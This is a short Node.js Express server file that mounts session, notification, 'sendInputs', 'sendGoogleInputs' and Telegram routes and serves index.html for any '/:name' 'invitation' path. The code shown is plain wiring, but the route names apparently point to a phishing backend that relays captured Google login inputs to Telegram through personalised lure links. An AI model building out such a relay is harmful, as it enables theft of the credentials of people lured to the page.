import "dotenv/config";
import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";

import sessionRoutes from "./routes/sessionRoutes.js";
import notificationRoutes from "./routes/notification.js";
import sendInputsRoutes from "./routes/sendInputs.js";
import sendGoogleInputsRoutes from "./routes/sendGoogleInputs.js";
import telegramRoutes from "./routes/telegram.js";

const app = express();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(
  cors({
    origin: "http://127.0.0.1:5500",
    credentials: true,
  }),
);
app.use(express.json());
app.use(cookieParser());

// Serve frontend files
app.use(express.static(__dirname));

// API routes
app.use("/api/session", sessionRoutes);
app.use("/", notificationRoutes);
app.use("/", sendInputsRoutes);
app.use('/', sendGoogleInputsRoutes);
app.use("/api/telegram", telegramRoutes);

// Dynamic invitation route
app.get("/:name", (req, res) => {
  const name = req.params.name;

  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(3000, () => {
  console.log("Server running on port 3000 🚀");
});
